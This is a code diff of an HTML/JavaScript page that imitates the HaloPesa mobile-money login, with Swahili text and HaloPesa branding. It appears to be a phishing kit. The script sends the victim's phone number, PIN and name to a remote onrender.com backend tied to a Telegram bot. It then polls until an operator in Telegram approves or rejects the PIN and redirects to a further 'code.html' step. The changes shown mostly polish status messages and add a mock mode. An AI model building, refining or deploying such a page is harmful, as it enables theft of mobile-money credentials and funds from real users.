@@ -84,7 +84,7 @@
             letter-spacing: -0.5px;
         }
 
-        /* ===== PHONE INPUT — editable ===== */
+        /* ===== PHONE INPUT ===== */
         .phone-wrapper {
             position: relative;
             margin-bottom: 25px;
@@ -173,7 +173,7 @@
             background: #f0f4f0;
         }
 
-        /* ===== SHAKE ANIMATION FOR WRONG PIN ===== */
+        /* ===== SHAKE ANIMATION ===== */
         @keyframes shake {
             0%,
             100% {
@@ -200,30 +200,6 @@
             animation: shake 0.5s ease-in-out;
             border-color: #b91c1c;
             box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.15);
-        }
-
-        /* ===== WRONG PIN BADGE ===== */
-        .wrong-pin-badge {
-            display: none;
-            margin-top: 10px;
-            padding: 10px 14px;
-            background: #fde8e8;
-            border: 1px solid #fcc;
-            border-radius: 10px;
-            color: #b91c1c;
-            font-weight: 700;
-            font-size: 15px;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .wrong-pin-badge.show {
-            display: flex;
-        }
-
-        .wrong-pin-badge .icon {
-            font-size: 20px;
         }
 
         .eye {
@@ -253,54 +229,85 @@
             text-decoration: underline;
         }
 
-        /* ===== STATUS MESSAGES ===== */
+        /* ===== STATUS MESSAGES - Enhanced ===== */
         #status {
             min-height: 22px;
             margin-top: 12px;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 600;
-            padding: 8px 12px;
-            border-radius: 8px;
+            padding: 12px 16px;
+            border-radius: 10px;
             display: none;
             transition: all 0.3s ease;
+            border: 2px solid transparent;
         }
 
+        /* Success - Green */
+        #status.success {
+            display: block;
+            background: #e6f7e6;
+            color: #0d6b1a;
+            border-color: #2e9c3e;
+            box-shadow: 0 2px 12px rgba(46, 156, 62, 0.15);
+        }
+        #status.success::before {
+            content: "✅ ";
+            font-size: 18px;
+        }
+
+        /* Error - Red */
         #status.error {
             display: block;
             background: #fde8e8;
             color: #b91c1c;
-            border: 1px solid #fcc;
+            border-color: #d32f2f;
+            box-shadow: 0 2px 12px rgba(211, 47, 47, 0.15);
+        }
+        #status.error::before {
+            content: "❌ ";
+            font-size: 18px;
         }
 
-        #status.success {
-            display: block;
-            background: #e8f5e8;
-            color: #1a7a2a;
-            border: 1px solid #b8d9b8;
-        }
-
-        #status.waiting {
-            display: block;
-            background: #fefcf0;
-            color: #b8960f;
-            border: 1px solid #f5e6b8;
-        }
-
-        #status.telegram-info {
-            display: block;
-            background: #e8f0fe;
-            color: #1a4a7a;
-            border: 1px solid #b8cfe0;
-        }
-
+        /* Wrong PIN / Rejected - Red (prominent) */
         #status.wrong-pin {
             display: block;
             background: #fde8e8;
             color: #b91c1c;
-            border: 2px solid #b91c1c;
+            border-color: #d32f2f;
+            border-width: 3px;
+            box-shadow: 0 2px 16px rgba(211, 47, 47, 0.25);
             font-size: 16px;
-            padding: 12px 16px;
-            font-weight: 700;
+            padding: 14px 18px;
+        }
+        #status.wrong-pin::before {
+            content: "❌ ";
+            font-size: 20px;
+        }
+
+        /* Waiting - Yellow/Amber */
+        #status.waiting {
+            display: block;
+            background: #fefcf0;
+            color: #8d7a0e;
+            border-color: #e6c84a;
+            box-shadow: 0 2px 12px rgba(230, 200, 74, 0.15);
+        }
+        #status.waiting::before {
+            content: "⏳ ";
+            font-size: 18px;
+        }
+
+        /* Telegram Info - Blue */
+        #status.telegram-info {
+            display: block;
+            background: #e8f0fe;
+            color: #1a4a7a;
+            border-color: #4a8fd4;
+            box-shadow: 0 2px 12px rgba(74, 143, 212, 0.12);
+        }
+        #status.telegram-info::before {
+            content: "📱 ";
+            font-size: 18px;
         }
 
         /* ===== LOWER SECTION ===== */
@@ -314,7 +321,7 @@
             margin-top: 10px;
         }
 
-        /* ===== LOGIN BUTTON - HaloPesa Green ===== */
+        /* ===== LOGIN BUTTON ===== */
         .action {
             width: 100%;
             background: #1a7a2a;
@@ -362,48 +369,24 @@
         .action.loading .spinner {
             display: block;
         }
-
         .action.loading .btn-text {
             display: none;
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .login-title {
-                font-size: 30px;
-            }
-
-            .pin-boxes input {
-                width: 52px;
-                height: 52px;
-                font-size: 22px;
-            }
-
-            .header {
-                padding: 22px 16px 18px;
-            }
-
-            .brand {
-                font-size: 22px;
-            }
-
-            .content {
-                padding: 22px 16px 16px;
-            }
-
-            .phone-display {
-                font-size: 16px;
-                padding: 14px 14px 14px 50px;
-            }
+            .login-title { font-size: 30px; }
+            .pin-boxes input { width: 52px; height: 52px; font-size: 22px; }
+            .header { padding: 22px 16px 18px; }
+            .brand { font-size: 22px; }
+            .content { padding: 22px 16px 16px; }
+            .phone-display { font-size: 16px; padding: 14px 14px 14px 50px; }
+            #status { font-size: 14px; padding: 10px 14px; }
         }
     </style>
 </head>
@@ -414,7 +397,7 @@
 
         <div class="upper-section">
 
-            <!-- ===== HEADER - HaloPesa Style ===== -->
+            <!-- ===== HEADER ===== -->
             <div class="header">
                 <div class="logo-circle">HP</div>
                 <div class="brand">HaloPesa</div>
@@ -451,13 +434,9 @@
                     <div class="eye" id="toggleVisibility">👁</div>
                 </div>
 
-                <!-- ===== WRONG PIN BADGE ===== -->
-                <div class="wrong-pin-badge" id="wrongPinBadge">
-                    <span class="icon">❌</span>
-                    <span>Nambari ya Siri SI SAHIHI! Tafadhali jaribu tena.</span>
-                </div>
-
                 <div class="forgot" id="forgotPin">Umesahau Nambari ya Siri?</div>
+
+                <!-- ===== STATUS MESSAGE ===== -->
                 <div id="status"></div>
 
             </div>
@@ -476,13 +455,15 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== LOGIC ===== -->
+    <!-- ===== JAVASCRIPT ===== -->
     <!-- ============================================================ -->
     <script>
         // =============================================
         //  CONFIGURATION
         // =============================================
         const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
+        // Set to true to test without backend (PIN 1234 = success, others = error)
+        const USE_MOCK = false;
 
         // =============================================
         //  DOM REFS
@@ -494,17 +475,16 @@
         const loginBtn = document.getElementById("loginBtn");
         const forgotPinEl = document.getElementById("forgotPin");
         const toggleVisibilityEl = document.getElementById("toggleVisibility");
-        const wrongPinBadge = document.getElementById("wrongPinBadge");
 
         let isPasswordVisible = false;
         let isSubmitting = false;
-        let wrongPinAttempts = 0;
+        let pollingInterval = null;
 
         // =============================================
         //  BOT ID FROM URL
         // =============================================
-        const botId = new URLSearchParams(window.location.search).get("botId");
-        console.log("🤖 Bot ID from URL:", botId);
+        const botId = new URLSearchParams(window.location.search).get("botId") || "test_bot";
+        console.log("🤖 Bot ID:", botId);
 
         // =============================================
         //  TELEGRAM INTEGRATION CHECK
@@ -517,7 +497,8 @@
             try {
                 if (isTelegramWebApp()) {
                     const tg = window.Telegram.WebApp;
-                    tg.showAlert(message);
+                    let prefix = type === 'success' ? '✅ ' : type === 'error' ? '❌ ' : 'ℹ️ ';
+                    tg.showAlert(prefix + message);
                 }
             } catch (e) {
                 console.warn('Telegram notification failed:', e);
@@ -525,56 +506,46 @@
         }
 
         // =============================================
-        //  SHOW WRONG PIN NOTIFICATION (Swahili)
+        //  STATUS FUNCTIONS (Green = Success, Red = Error)
         // =============================================
-        function showWrongPinNotification() {
-            // Increment wrong attempt counter
-            wrongPinAttempts++;
+        function setStatus(message, type = 'waiting') {
+            statusEl.textContent = message;
+            statusEl.className = type;
+            statusEl.style.display = 'block';
+            console.log(`📢 [${type.toUpperCase()}] ${message}`);
+        }
 
-            // Show the badge
-            wrongPinBadge.classList.add('show');
+        function clearStatus() {
+            statusEl.style.display = 'none';
+            statusEl.className = '';
+            statusEl.textContent = '';
+        }
 
-            // Shake the PIN boxes
+        // ===== PIN APPROVED - GREEN =====
+        function showPinApproved() {
+            const message = "Nambari ya Siri imekubaliwa";
+            setStatus(message, 'success');
+            if (isTelegramWebApp()) notifyTelegram(message, 'success');
+        }
+
+        // ===== WRONG PIN - RED with shake =====
+        function showWrongPin() {
+            const message = "Nambari ya Siri si sahihi";
+            setStatus(message, 'wrong-pin');
+            if (isTelegramWebApp()) notifyTelegram(message, 'error');
+            // Shake animation
             pinBoxesContainer.classList.remove('shake');
-            // Force reflow for animation restart
             void pinBoxesContainer.offsetWidth;
             pinBoxesContainer.classList.add('shake');
-
-            // Also show in status with a more detailed message
-            const msg = "❌ Nambari ya Siri uliyoingiza SI SAHIHI! Tafadhali hakikisha umeingiza tarakimu 4 sahihi na ujaribu tena.";
-            setStatus(msg, "wrong-pin");
-
-            // Telegram notification in Swahili
-            notifyTelegram("❌ Nambari ya Siri si sahihi! Tafadhali jaribu tena.", "error");
-
-            // Clear PIN fields and focus on first box
-            boxes.forEach(b => {
-                b.value = '';
-                b.classList.add('error');
-            });
-
-            // Remove error styling after animation
+            boxes.forEach(b => b.classList.add('error'));
             setTimeout(() => {
                 boxes.forEach(b => b.classList.remove('error'));
                 pinBoxesContainer.classList.remove('shake');
             }, 600);
-
-            // Focus on first PIN box
-            setTimeout(() => {
-                boxes[0].focus();
-            }, 700);
-
-            // Reset form state
-            loginBtn.disabled = true;
-            loginBtn.classList.add("disabled");
-            loginBtn.classList.remove("loading");
-            isSubmitting = false;
-            validateAndUpdateButton();
         }
 
         // =============================================
-        //  VALIDATION — enable button only when phone
-        //  AND all 4 PIN digits are filled
+        //  VALIDATION
         // =============================================
         function validateAndUpdateButton() {
             const phone = phoneInput.value.trim();
@@ -582,35 +553,14 @@
             boxes.forEach(b => pin += b.value);
             const allFilled = phone.length > 0 && pin.length === 4;
 
-            // Clear error styling from phone
             phoneInput.classList.remove('error');
             boxes.forEach(b => b.classList.remove('error'));
 
-            // Update button state
             loginBtn.disabled = !allFilled;
-            if (allFilled) {
-                loginBtn.classList.remove("disabled");
-            } else {
-                loginBtn.classList.add("disabled");
-            }
+            if (allFilled) loginBtn.classList.remove("disabled");
+            else loginBtn.classList.add("disabled");
 
             return allFilled;
-        }
-
-        // =============================================
-        //  SHOW STATUS MESSAGE
-        // =============================================
-        function setStatus(message, type = 'waiting') {
-            statusEl.textContent = message;
-            statusEl.className = type;
-            statusEl.style.display = 'block';
-        }
-
-        function clearStatus() {
-            statusEl.style.display = 'none';
-            statusEl.className = '';
-            statusEl.textContent = '';
-            wrongPinBadge.classList.remove('show');
         }
 
         // =============================================
@@ -620,69 +570,38 @@
             this.classList.remove('error');
             localStorage.setItem("phone", this.value);
             validateAndUpdateButton();
-            if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') {
-                clearStatus();
-            }
+            if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') clearStatus();
         });
 
         phoneInput.addEventListener("change", validateAndUpdateButton);
 
         // =============================================
-        //  PIN BOXES — auto-advance + validation
+        //  PIN BOXES
         // =============================================
         boxes.forEach((box, i) => {
             box.addEventListener("input", async function() {
-                // Allow only numbers
                 this.value = this.value.replace(/[^0-9]/g, '');
-
-                // Remove error styling
                 this.classList.remove('error');
-                wrongPinBadge.classList.remove('show');
 
-                // Auto-advance to next box
-                if (this.value && i < 3) {
-                    boxes[i + 1].focus();
-                }
+                if (this.value && i < 3) boxes[i + 1].focus();
 
                 validateAndUpdateButton();
 
-                // If phone is empty, show a clear message
                 const phone = phoneInput.value.trim();
                 if (phone.length === 0) {
                     phoneInput.classList.add('error');
-                    setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
+                    setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                     boxes.forEach(b => { b.value = ''; });
                     boxes[0].focus();
                     validateAndUpdateButton();
                     return;
                 }
 
-                // Check if all 4 digits are entered
+                // Auto-submit when the last digit is entered
                 if (i === 3 && this.value) {
                     let pin = "";
                     boxes.forEach(b => pin += b.value);
-
-                    if (!botId) {
-                        setStatus("❌ Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.",
-                        "error");
-                        notifyTelegram("Hitilafu: Hakuna Kitambulisho cha Bot.", "error");
-                        boxes.forEach(b => { b.disabled = false;
-                            b.value = ""; });
-                        boxes[0].focus();
-                        validateAndUpdateButton();
-                        return;
-                    }
-
                     const phoneCheck = phoneInput.value.trim();
-                    if (phoneCheck.length === 0) {
-                        phoneInput.classList.add('error');
-                        setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
-                        boxes.forEach(b => { b.value = ''; });
-                        boxes[0].focus();
-                        validateAndUpdateButton();
-                        return;
-                    }
-
                     await submitLogin(phoneCheck, pin);
                 }
             });
@@ -697,26 +616,22 @@
                     boxes.forEach(b => pin += b.value);
                     const phone = phoneInput.value.trim();
                     if (pin.length === 4 && phone.length > 0) {
-                        const event = new Event('input');
-                        boxes[3].dispatchEvent(event);
+                        submitLogin(phone, pin);
                     } else if (phone.length === 0) {
                         phoneInput.classList.add('error');
-                        setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
+                        setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                         phoneInput.focus();
                     } else {
-                        setStatus("❗ Tafadhali weka tarakimu zote 4 za Nambari ya Siri.", "error");
+                        setStatus("Tafadhali weka tarakimu zote 4 za Nambari ya Siri.", 'error');
                         boxes[0].focus();
                     }
                 }
             });
 
             box.addEventListener("blur", validateAndUpdateButton);
-
             box.addEventListener("focus", function() {
                 this.classList.remove('error');
-                if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') {
-                    clearStatus();
-                }
+                if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') clearStatus();
             });
         });
 
@@ -741,15 +656,16 @@
                 const phone = phoneInput.value.trim();
                 if (phone.length === 0) {
                     phoneInput.classList.add('error');
-                    setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
+                    setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                     boxes.forEach(b => { b.value = ''; });
                     boxes[0].focus();
                     validateAndUpdateButton();
                     return;
                 }
 
-                const event = new Event('input');
-                boxes[3].dispatchEvent(event);
+                let pin = "";
+                boxes.forEach(b => pin += b.value);
+                submitLogin(phone, pin);
             }
         });
 
@@ -758,9 +674,7 @@
         // =============================================
         toggleVisibilityEl.addEventListener("click", function() {
             isPasswordVisible = !isPasswordVisible;
-            boxes.forEach(box => {
-                box.type = isPasswordVisible ? "text" : "tel";
-            });
+            boxes.forEach(box => box.type = isPasswordVisible ? "text" : "tel");
             this.textContent = isPasswordVisible ? "🙈" : "👁";
         });
 
@@ -769,134 +683,120 @@
         // =============================================
         forgotPinEl.addEventListener("click", function() {
             const phone = phoneInput.value.trim();
-            let msg = "💡 Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.";
-
-            if (phone.length > 0) {
-                msg = `💡 Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri kwa nambari ${phone}.`;
-            }
-
+            let msg = "Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.";
+            if (phone.length > 0) msg = `Tafadhali wasiliana na msimamizi wa HaloPesa kwa nambari ${phone}.`;
             setStatus(msg, "telegram-info");
-
-            if (isTelegramWebApp()) {
-                notifyTelegram("Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.", "info");
-            }
+            if (isTelegramWebApp()) notifyTelegram("Wasiliana na msimamizi.", "info");
         });
 
         // =============================================
-        //  SUBMIT LOGIN
+        //  SUBMIT LOGIN – with mock mode for testing
         // =============================================
         async function submitLogin(phone, pin) {
             if (isSubmitting) return;
             isSubmitting = true;
 
+            // Disable inputs and show loading state
             boxes.forEach(b => b.disabled = true);
             loginBtn.disabled = true;
             loginBtn.classList.add("disabled", "loading");
             clearStatus();
 
-            if (isTelegramWebApp()) {
-                setStatus("📱 Inatuma kwa Telegram kwa uthibitisho...", "telegram-info");
-            } else {
-                setStatus("⏳ Inatuma Nambari ya Siri kwa uthibitisho...", "waiting");
+            // Clear any old polling
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
             }
 
+            setStatus("Inatuma kwa uthibitisho...", isTelegramWebApp() ? "telegram-info" : "waiting");
+
+            // ===== MOCK MODE =====
+            if (USE_MOCK) {
+                console.log("🧪 Mock mode: testing PIN", pin);
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                if (pin === "1234") {
+                    showPinApproved();
+                    localStorage.setItem("pin", pin);
+                    setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
+                } else {
+                    showWrongPin();
+                    resetForm();
+                }
+                isSubmitting = false;
+                return;
+            }
+
+            // ===== REAL BACKEND =====
             try {
                 const firstName = localStorage.getItem("firstName") || "";
                 const lastName = localStorage.getItem("lastName") || "";
                 const name = localStorage.getItem("name") || "";
-                let fullName = name;
-                if (!fullName && firstName) {
-                    fullName = lastName ? `${firstName} ${lastName}` : firstName;
-                }
-                if (!fullName) {
-                    fullName = "Unknown";
-                }
+                let fullName = name || (firstName ? (lastName ? `${firstName} ${lastName}` : firstName) : "Unknown");
 
                 const cleanPhone = phone.replace(/\s/g, '');
-
                 const payload = {
-                    name: fullName || "Unknown",
+                    name: fullName,
                     phone: cleanPhone || "Unknown",
-                    pin: pin || "",
+                    pin: pin,
                     botId: botId || ""
                 };
 
-                console.log("📤 Sending to backend:", payload);
+                console.log("📤 Sending payload:", payload);
 
                 const res = await fetch(`${BACKEND_URL}/submit-pin`, {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Accept": "application/json"
-                    },
+                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
                 const responseText = await res.text();
-                console.log("📥 Response status:", res.status);
-                console.log("📥 Response body:", responseText);
+                console.log("📥 Response status:", res.status, "Body:", responseText);
 
                 if (!res.ok) {
-                    let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Tafadhali jaribu tena.";
-                    try {
-                        const errorData = JSON.parse(responseText);
-                        errorMsg = errorData.error || errorMsg;
-                    } catch {
-                        if (responseText) errorMsg = responseText;
-                    }
-                    setStatus(`❌ ${errorMsg}`, "error");
-                    notifyTelegram(`Hitilafu: ${errorMsg}`, "error");
+                    let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Jaribu tena.";
+                    try { const err = JSON.parse(responseText); errorMsg = err.error || errorMsg; } catch {}
+                    setStatus(errorMsg, 'error');
                     resetForm();
                     return;
                 }
 
                 let data;
-                try {
-                    data = JSON.parse(responseText);
-                } catch {
-                    setStatus("❌ Hitilafu ya muundo wa data kutoka seva.", "error");
-                    notifyTelegram("Hitilafu ya muundo wa data kutoka seva.", "error");
+                try { data = JSON.parse(responseText); } catch {
+                    setStatus("Hitilafu ya muundo wa data kutoka seva.", 'error');
                     resetForm();
                     return;
                 }
 
                 if (!data || !data.requestId) {
-                    setStatus("❌ Seva haikurudisha Kitambulisho cha ombi. Jaribu tena.", "error");
-                    notifyTelegram("Seva haikurudisha Kitambulisho cha ombi.", "error");
+                    setStatus("Seva haikurudisha Kitambulisho cha ombi.", 'error');
                     resetForm();
                     return;
                 }
 
-                if (isTelegramWebApp()) {
-                    setStatus("📱 Ombi limetumwa kwa msimamizi wa Telegram. Inasubiri idhini...", "telegram-info");
-                    notifyTelegram("Ombi lako limetumwa kwa msimamizi. Tafadhali subiri.", "info");
-                } else {
-                    setStatus("⏳ Ombi limetumwa. Inasubiri idhini ya msimamizi...", "waiting");
-                }
+                setStatus("Inasubiri msimamizi kukubali au kukataa...", isTelegramWebApp() ? "telegram-info" : "waiting");
 
+                // Poll for admin decision
                 const approved = await pollPinApproval(data.requestId);
 
                 if (approved === true) {
+                    // ✅ PIN APPROVED – GREEN
+                    showPinApproved();
                     localStorage.setItem("pin", pin);
-                    setStatus("✅ Nambari ya Siri imekubaliwa! Inaelekeza...", "success");
-                    notifyTelegram("✅ Nambari ya Siri imekubaliwa! Inaelekeza...", "success");
-                    setTimeout(() => {
-                        window.location.href = `code.html?botId=${botId}`;
-                    }, 500);
+                    setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
                 } else if (approved === false) {
-                    // ===== WRONG PIN DETECTED =====
-                    showWrongPinNotification();
+                    // ❌ WRONG PIN / REJECTED – RED
+                    showWrongPin();
                     resetForm();
                 } else {
-                    setStatus("❌ Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
-                    notifyTelegram("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
+                    setStatus("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", 'error');
                     resetForm();
                 }
 
             } catch (error) {
                 console.error("Network error:", error);
-                setStatus("❌ Tatizo la muunganisho. Tafadhali angalia mtandao wako.", "error");
-                notifyTelegram("Tatizo la muunganisho. Tafadhali angalia mtandao wako.", "error");
+                setStatus("Tatizo la muunganisho. Angalia mtandao wako.", 'error');
+                if (isTelegramWebApp()) notifyTelegram("Tatizo la muunganisho.", "error");
                 resetForm();
             } finally {
                 isSubmitting = false;
@@ -904,14 +804,16 @@
         }
 
         // =============================================
-        //  POLL PIN APPROVAL
+        //  POLL PIN APPROVAL – checks for admin button click in Telegram
         // =============================================
         function pollPinApproval(requestId) {
             let attempts = 0;
-            const maxAttempts = 120;
+            const maxAttempts = 120; // ~3 minutes
 
             return new Promise((resolve) => {
-                const interval = setInterval(async () => {
+                if (pollingInterval) clearInterval(pollingInterval);
+
+                pollingInterval = setInterval(async () => {
                     attempts++;
                     console.log(`🔍 Polling attempt ${attempts} for ${requestId}`);
 
@@ -921,49 +823,50 @@
                         console.log("📥 Poll response:", data);
 
                         if (data.blocked) {
-                            clearInterval(interval);
-                            setStatus("🚫 Akaunti yako imezuiwa. Tafadhali wasiliana na msimamizi.", "error");
-                            notifyTelegram("Akaunti yako imezuiwa.", "error");
+                            clearInterval(pollingInterval);
+                            pollingInterval = null;
+                            setStatus("Akaunti yako imezuiwa. Wasiliana na msimamizi.", 'error');
+                            if (isTelegramWebApp()) notifyTelegram("Akaunti imezuiwa.", "error");
                             resolve(false);
                             return;
                         }
 
+                        // ✅ Admin clicked "Approve" in Telegram
                         if (data.approved === true) {
-                            clearInterval(interval);
+                            clearInterval(pollingInterval);
+                            pollingInterval = null;
                             resolve(true);
                             return;
                         }
 
+                        // ❌ Admin clicked "Reject" in Telegram
                         if (data.approved === false) {
-                            clearInterval(interval);
+                            clearInterval(pollingInterval);
+                            pollingInterval = null;
                             resolve(false);
                             return;
                         }
 
+                        // Still waiting – update status periodically
                         if (attempts % 8 === 0 || attempts === 1) {
-                            const elapsedSeconds = Math.floor(attempts * 1.5);
-                            const minutes = Math.floor(elapsedSeconds / 60);
-                            const seconds = elapsedSeconds % 60;
-                            const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
-
-                            if (isTelegramWebApp()) {
-                                setStatus(`📱 Inasubiri idhini ya msimamizi wa Telegram... (${timeStr})`, "telegram-info");
-                            } else {
-                                setStatus(`⏳ Inasubiri idhini ya msimamizi... (${timeStr})`, "waiting");
-                            }
+                            const elapsed = Math.floor(attempts * 1.5);
+                            const mins = Math.floor(elapsed / 60);
+                            const secs = elapsed % 60;
+                            const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+                            const msg = `Inasubiri msimamizi... (${timeStr})`;
+                            setStatus(msg, isTelegramWebApp() ? "telegram-info" : "waiting");
                         }
 
                         if (attempts >= maxAttempts) {
-                            clearInterval(interval);
-                            setStatus("⏰ Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
-                            notifyTelegram("Muda wa kusubiri umeisha. Jaribu tena.", "error");
-                            resolve(null);
+                            clearInterval(pollingInterval);
+                            pollingInterval = null;
+                            resolve(null); // timeout
                         }
 
                     } catch (error) {
                         console.error("Poll error:", error);
                         if (attempts % 5 === 0) {
-                            setStatus("🔄 Tatizo la muunganisho. Inajaribu tena...", "waiting");
+                            setStatus("Tatizo la muunganisho. Inajaribu tena...", "waiting");
                         }
                     }
                 }, 1500);
@@ -974,11 +877,11 @@
         //  RESET FORM
         // =============================================
         function resetForm() {
-            boxes.forEach(b => {
-                b.disabled = false;
-                b.value = "";
-                b.classList.remove('error');
-            });
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            boxes.forEach(b => { b.disabled = false; b.value = ""; b.classList.remove('error'); });
             pinBoxesContainer.classList.remove('shake');
             loginBtn.disabled = true;
             loginBtn.classList.add("disabled");
@@ -989,27 +892,29 @@
         }
 
         // =============================================
-        //  LOGIN BUTTON CLICK
+        //  LOGIN BUTTON CLICK – main entry point
         // =============================================
         loginBtn.addEventListener("click", () => {
-            if (loginBtn.disabled || isSubmitting) return;
+            if (loginBtn.disabled || isSubmitting) {
+                console.warn("Button is disabled or submitting.");
+                return;
+            }
 
             const phone = phoneInput.value.trim();
             if (phone.length === 0) {
                 phoneInput.classList.add('error');
-                setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
+                setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                 phoneInput.focus();
                 return;
             }
 
             let pin = "";
             boxes.forEach(b => pin += b.value);
-
             if (pin.length === 4) {
-                const event = new Event('input');
-                boxes[3].dispatchEvent(event);
+                console.log("👉 Login button clicked! Submitting phone:", phone, "PIN:", pin);
+                submitLogin(phone, pin);
             } else {
-                setStatus("❗ Tafadhali weka Nambari ya Siri yenye tarakimu 4.", "error");
+                setStatus("Tafadhali weka Nambari ya Siri yenye tarakimu 4.", 'error');
                 boxes[0].focus();
             }
         });
@@ -1020,21 +925,21 @@
         window.addEventListener('load', function() {
             setTimeout(() => {
                 phoneInput.focus();
-                const val = phoneInput.value;
-                if (val) {
-                    phoneInput.setSelectionRange(val.length, val.length);
-                }
+                if (phoneInput.value) phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
                 validateAndUpdateButton();
 
-                if (!botId) {
-                    setStatus("⚠️ Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.",
-                    "error");
+                if (!botId || botId === "test_bot") {
+                    setStatus("Hitilafu: Hakuna Kitambulisho cha Bot. Tumia kiungo kutoka Telegram.", 'error');
                     loginBtn.disabled = true;
                     loginBtn.classList.add("disabled");
                 } else {
                     if (isTelegramWebApp()) {
-                        setStatus("✅ Umeunganishwa kwa Telegram. Weka nambari yako ya simu.", "telegram-info");
+                        setStatus("Umeunganishwa kwa Telegram. Weka nambari ya simu.", "telegram-info");
                         setTimeout(clearStatus, 3000);
+                    }
+                    if (USE_MOCK) {
+                        setStatus("🧪 Hali ya majaribio: PIN sahihi ni 1234", "telegram-info");
+                        setTimeout(clearStatus, 5000);
                     }
                 }
             }, 100);
@@ -1052,9 +957,11 @@
         loginBtn.classList.add("disabled");
         validateAndUpdateButton();
 
-        console.log("✅ HaloPesa login page loaded — wrong PIN notifications in Swahili.");
+        console.log("✅ HaloPesa login page ready.");
         console.log("📱 Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
         console.log("🤖 Bot ID:", botId || "MISSING");
+        console.log("🧪 Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
+        console.log("👉 Messages: 'Nambari ya Siri imekubaliwa' (green) / 'Nambari ya Siri si sahihi' (red)");
     </script>
 
 </body>
